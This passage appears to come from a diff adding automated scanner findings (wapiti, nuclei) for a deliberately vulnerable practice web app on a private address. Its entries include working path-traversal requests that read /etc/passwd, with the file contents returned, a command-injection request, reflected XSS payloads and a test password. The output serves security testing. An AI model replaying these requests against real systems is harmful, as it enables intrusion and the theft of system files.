</br></br>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false\nmysql:x:999:999::/home/mysql:/bin/sh\nsshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin\nmessagebus:x:105:108::/var/run/dbus:/bin/false\n<div align='center'><b><h5>/etc/passwd</h5></b></div>    </body>\r\n</html>\r\n",
+      "curlCommand": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' 'http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/admin/index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd'",
+      "ip": "192.168.64.2"
+    },
+    {
+      "id": "wapiti-Cleartext Submission of Password-28",
+      "tool": "wapiti",
+      "category": "Cleartext Submission of Password",
+      "severity": "low",
+      "title": "Cleartext Submission of Password",
+      "description": "Password field password sent in clear text from URL http://192.168.64.2:9991/www/CommandExecution/CommandExec-1.php",
+      "endpoint": "/www/CommandExecution/CommandExec-1.php",
+      "fullUrl": "/www/CommandExecution/CommandExec-1.php",
+      "method": "",
+      "parameter": "password",
+      "evidence": "password",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CONF-07"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CONF-07"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-1.php\""
+    },
+    {
+      "id": "wapiti-Cleartext Submission of Password-29",
+      "tool": "wapiti",
+      "category": "Cleartext Submission of Password",
+      "severity": "low",
+      "title": "Cleartext Submission of Password",
+      "description": "Password field password sent in clear text from URL http://192.168.64.2:9991/www/CommandExecution/CommandExec-1.php?username=Admin&password=Letm3in_",
+      "endpoint": "/www/CommandExecution/CommandExec-1.php",
+      "fullUrl": "/www/CommandExecution/CommandExec-1.php",
+      "method": "",
+      "parameter": "password",
+      "evidence": "password",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CONF-07"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CONF-07"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-1.php?username=Admin&password=Letm3in_\" -e \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-1.php\""
+    },
+    {
+      "id": "wapiti-Content Security Policy Configuration-30",
+      "tool": "wapiti",
+      "category": "Content Security Policy Configuration",
+      "severity": "low",
+      "title": "Content Security Policy Configuration",
+      "description": "CSP is not set for URL: http://192.168.64.2:9991/www/CommandExecution/CommandExec-1.php",
+      "endpoint": "/www/CommandExecution/CommandExec-1.php",
+      "fullUrl": "/www/CommandExecution/CommandExec-1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CONF-12",
+        "OSHP-Content-Security-Policy"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CONF-12",
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-Content-Security-Policy"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-1.php\""
+    },
+    {
+      "id": "wapiti-Command execution-31",
+      "tool": "wapiti",
+      "category": "Command execution",
+      "severity": "low",
+      "title": "Command execution",
+      "description": "Command execution via injection in the parameter username",
+      "endpoint": "/www/CommandExecution/CommandExec-1.php",
+      "fullUrl": "/www/CommandExecution/CommandExec-1.php",
+      "method": "",
+      "parameter": "username",
+      "evidence": "username",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-INPV-12"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-INPV-12"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-1.php?username=id&password=Letm3in_\" -e \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-1.php\""
+    },
+    {
+      "id": "wapiti-Clickjacking Protection-32",
+      "tool": "wapiti",
+      "category": "Clickjacking Protection",
+      "severity": "low",
+      "title": "Clickjacking Protection",
+      "description": "X-Frame-Options is not set",
+      "endpoint": "/www/CommandExecution/CommandExec-1.php",
+      "fullUrl": "/www/CommandExecution/CommandExec-1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Frame-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Frame-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-1.php\""
+    },
+    {
+      "id": "wapiti-MIME Type Confusion-33",
+      "tool": "wapiti",
+      "category": "MIME Type Confusion",
+      "severity": "low",
+      "title": "MIME Type Confusion",
+      "description": "X-Content-Type-Options is not set",
+      "endpoint": "/www/CommandExecution/CommandExec-1.php",
+      "fullUrl": "/www/CommandExecution/CommandExec-1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Content-Type-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Content-Type-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-1.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-34",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+      "endpoint": "/www/CommandExecution/CommandExec-1.php",
+      "fullUrl": "/www/CommandExecution/CommandExec-1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-1.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-35",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://192.168.64.2:9991/www/CommandExecution/CommandExec-1.php?username=Admin&password=Letm3in_. The server did not enforce HTTPS.",
+      "endpoint": "/www/CommandExecution/CommandExec-1.php",
+      "fullUrl": "/www/CommandExecution/CommandExec-1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-1.php?username=Admin&password=Letm3in_\" -e \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-1.php\""
+    },
+    {
+      "id": "nuclei-xss-36",
+      "tool": "nuclei",
+      "category": "XSS",
+      "severity": "medium",
+      "title": "Fuzzing Parameters - Cross-Site Scripting",
+      "description": "Cross-site scripting was discovered via a search for reflected parameter values in the server response via GET-requests.\n",
+      "impact": "N/A",
+      "endpoint": "http://192.168.64.2:9991/www/XSS/XSS_level2.php/",
+      "fullUrl": "http://192.168.64.2:9991/www/XSS/XSS_level2.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E",
+      "method": "GET",
+      "cve": null,
+      "evidence": "",
+      "recommendation": "",
+      "references": [],
+      "request": "GET /www/XSS/XSS_level2.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E HTTP/1.1\r\nHost: 192.168.64.2:9991\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.2; rv:140.0.) Gecko/20100101 Firefox/140.0.\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+      "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 676\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Tue, 30 Dec 2025 10:28:23 GMT\r\nServer: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3\r\nX-Powered-By: PHP/5.6.21\r\n\r\n<!DOCTYPE html>\n<html>\n<head>\n   <title>XSS 2</title>\n<link rel=\"shortcut icon\" href=\"../Resources/hmbct.png\" />\n</head>\n<body>\n\t\n\t <div style=\"background-color:#c9c9c9;padding:15px;\">\n      <button type=\"button\" name=\"homeButton\" onclick=\"location.href='../homepage.html';\">Home Page</button>\n      <button type=\"button\" name=\"mainButton\" onclick=\"location.href='xssmainpage.html';\">Main Page</button>\n    </div>\n<div align=\"center\">\n   <form method=\"GET\" action=\"\" name=\"form\">\n   <p>Your name:<input type=\"text\" name=\"username\"></p>\n   <input type=\"submit\" name=\"submit\" value=\"Submit\">\n</form>\n\t</div>\nYour name is '>\"<svg/onload=confirm('xss-username')>\n\n</body>\n</html>\n",
+      "curlCommand": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:140.0.) Gecko/20100101 Firefox/140.0.' 'http://192.168.64.2:9991/www/XSS/XSS_level2.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E'",
+      "ip": "192.168.64.2"
+    },
+    {
+      "id": "wapiti-Content Security Policy Configuration-37",
+      "tool": "wapiti",
+      "category": "Content Security Policy Configuration",
+      "severity": "low",
+      "title": "Content Security Policy Configuration",
+      "description": "CSP is not set for URL: http://192.168.64.2:9991/www/FileUpload/fileupload2.php",
+      "endpoint": "/www/FileUpload/fileupload2.php",
+      "fullUrl": "/www/FileUpload/fileupload2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CONF-12",
+        "OSHP-Content-Security-Policy"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CONF-12",
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-Content-Security-Policy"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileUpload/fileupload2.php\""
+    },
+    {
+      "id": "wapiti-Clickjacking Protection-38",
+      "tool": "wapiti",
+      "category": "Clickjacking Protection",
+      "severity": "low",
+      "title": "Clickjacking Protection",
+      "description": "X-Frame-Options is not set",
+      "endpoint": "/www/FileUpload/fileupload2.php",
+      "fullUrl": "/www/FileUpload/fileupload2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Frame-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Frame-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileUpload/fileupload2.php\""
+    },
+    {
+      "id": "wapiti-MIME Type Confusion-39",
+      "tool": "wapiti",
+      "category": "MIME Type Confusion",
+      "severity": "low",
+      "title": "MIME Type Confusion",
+      "description": "X-Content-Type-Options is not set",
+      "endpoint": "/www/FileUpload/fileupload2.php",
+      "fullUrl": "/www/FileUpload/fileupload2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Content-Type-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Content-Type-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileUpload/fileupload2.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-40",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+      "endpoint": "/www/FileUpload/fileupload2.php",
+      "fullUrl": "/www/FileUpload/fileupload2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileUpload/fileupload2.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-41",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://192.168.64.2:9991/www/FileUpload/fileupload2.php. The server did not enforce HTTPS.",
+      "endpoint": "/www/FileUpload/fileupload2.php",
+      "fullUrl": "/www/FileUpload/fileupload2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileUpload/fileupload2.php\" -e \"http://192.168.64.2:9991/www/FileUpload/fileupload2.php\" -F \"submit=Submit\" -F \"file=@your_local_file;filename=pix.gif\""
+    },
+    {
+      "id": "nuclei-xss-42",
+      "tool": "nuclei",
+      "category": "XSS",
+      "severity": "medium",
+      "title": "Fuzzing Parameters - Cross-Site Scripting",
+      "description": "Cross-site scripting was discovered via a search for reflected parameter values in the server response via GET-requests.\n",
+      "impact": "N/A",
+      "endpoint": "http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php/",
+      "fullUrl": "http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php/?order_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-order_id%27%29%3E&cookie=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cookie%27%29%3E&debug=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-debug%27%29%3E&m=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-m%27%29%3E&dir=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-dir%27%29%3E&new_role=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-new_role%27%29%3E&trashed=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-trashed%27%29%3E&log=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-log%27%29%3E&excerpt=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-excerpt%27%29%3E&settings-updated=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-settings-updated%27%29%3E&plugins=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-plugins%27%29%3E&modify=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-modify%27%29%3E&pwd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-pwd%27%29%3E&file=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-file%27%29%3E",
+      "method": "GET",
+      "cve": null,
+      "evidence": "",
+      "recommendation": "",
+      "references": [],
+      "request": "GET /www/FileInclusion/pages/lvl1.php/?order_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-order_id%27%29%3E&cookie=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cookie%27%29%3E&debug=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-debug%27%29%3E&m=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-m%27%29%3E&dir=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-dir%27%29%3E&new_role=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-new_role%27%29%3E&trashed=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-trashed%27%29%3E&log=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-log%27%29%3E&excerpt=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-excerpt%27%29%3E&settings-updated=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-settings-updated%27%29%3E&plugins=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-plugins%27%29%3E&modify=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-modify%27%29%3E&pwd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-pwd%27%29%3E&file=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-file%27%29%3E HTTP/1.1\r\nHost: 192.168.64.2:9991\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+      "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 851\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Tue, 30 Dec 2025 10:21:28 GMT\r\nServer: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3\r\nX-Powered-By: PHP/5.6.21\r\n\r\n<html>\r\n   <head>\r\n      <meta charset=\"utf-8\">\r\n      <link rel=\"shortcut icon\" href=\"../../Resources/hmbct.png\" />\r\n      <title> Level 1 </title>\r\n   </head>\r\n\r\n   <body>    \r\n      <div style=\"background-color:#c9c9c9;padding:15px;\">\r\n      <button type=\"button\" name=\"homeButton\" onclick=\"location.href='../../homepage.html';\">Home Page</button>\r\n      <button type=\"button\" name=\"mainButton\" onclick=\"location.href='fileinc.html';\">Main Page</button>  \r\n      </div>\r\n      \r\n      <div align=\"center\"><b><h3>This is Level 1</h3></b></div>\r\n      <div align=\"center\">\r\n      <a href=lvl1.php?file=1.php><button>Button</button></a>\r\n      <a href=lvl1.php?file=2.php><button>The Other Button!</button></a>\r\n      </div>\r\n      \r\n      </br></br><div align='center'><b><h5>'>\"<svg/onload=confirm('xss-file')></h5></b></div>    </body>\r\n</html>\r\n\r\n",
+      "curlCommand": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0' 'http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php/?order_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-order_id%27%29%3E&cookie=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cookie%27%29%3E&debug=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-debug%27%29%3E&m=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-m%27%29%3E&dir=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-dir%27%29%3E&new_role=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-new_role%27%29%3E&trashed=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-trashed%27%29%3E&log=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-log%27%29%3E&excerpt=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-excerpt%27%29%3E&settings-updated=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-settings-updated%27%29%3E&plugins=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-plugins%27%29%3E&modify=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-modify%27%29%3E&pwd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-pwd%27%29%3E&file=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-file%27%29%3E'",
+      "ip": "192.168.64.2"
+    },
+    {
+      "id": "nuclei-xss-43",
+      "tool": "nuclei",
+      "category": "XSS",
+      "severity": "high",
+      "title": "Centos Web Panel 0.9.8.480 - Local File Inclusion",
+      "description": "Centos Web Panel version 0.9.8.480 suffers from local file inclusion vulnerabilities. Other vulnerabilities including cross-site scripting and remote code execution are also known to impact this version.\n",
+      "impact": "Successful exploitation of this vulnerability allows an attacker to read sensitive files on the server.\n",
+      "endpoint": "http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php/admin/index.php",
+      "fullUrl": "http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php/admin/index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd",
+      "method": "GET",
+      "cve": "cve-2018-18323",
+      "evidence": "",
+      "recommendation": "",
+      "references": [],
+      "request": "GET /www/FileInclusion/pages/lvl1.php/admin/index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd HTTP/1.1\r\nHost: 192.168.64.2:9991\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15 MarketGoo/2.1\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+      "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 2191\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Tue, 30 Dec 2025 10:21:33 GMT\r\nServer: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3\r\nX-Powered-By: PHP/5.6.21\r\n\r\n<html>\r\n   <head>\r\n      <meta charset=\"utf-8\">\r\n      <link rel=\"shortcut icon\" href=\"../../Resources/hmbct.png\" />\r\n      <title> Level 1 </title>\r\n   </head>\r\n\r\n   <body>    \r\n      <div style=\"background-color:#c9c9c9;padding:15px;\">\r\n      <button type=\"button\" name=\"homeButton\" onclick=\"location.href='../../homepage.html';\">Home Page</button>\r\n      <button type=\"button\" name=\"mainButton\" onclick=\"location.href='fileinc.html';\">Main Page</button>  \r\n      </div>\r\n      \r\n      <div align=\"center\"><b><h3>This is Level 1</h3></b></div>\r\n      <div align=\"center\">\r\n      <a href=lvl1.php?file=1.php><button>Button</button></a>\r\n      <a href=lvl1.php?file=2.php><button>The Other Button!</button></a>\r\n      </div>\r\n      \r\n      </br></br>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false\nmysql:x:999:999::/home/mysql:/bin/sh\nsshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin\nmessagebus:x:105:108::/var/run/dbus:/bin/false\n<div align='center'><b><h5>/../../../../../../../../../../../etc/passwd</h5></b></div>    </body>\r\n</html>\r\n\r\n",
+      "curlCommand": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15 MarketGoo/2.1' 'http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php/admin/index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd'",
+      "ip": "192.168.64.2"
+    },
+    {
+      "id": "wapiti-Content Security Policy Configuration-44",
+      "tool": "wapiti",
+      "category": "Content Security Policy Configuration",
+      "severity": "low",
+      "title": "Content Security Policy Configuration",
+      "description": "CSP is not set for URL: http://192.168.64.2:9991/www/XSS/XSS_level1.php",
+      "endpoint": "/www/XSS/XSS_level1.php",
+      "fullUrl": "/www/XSS/XSS_level1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CONF-12",
+        "OSHP-Content-Security-Policy"
+      ],
+      "references": [
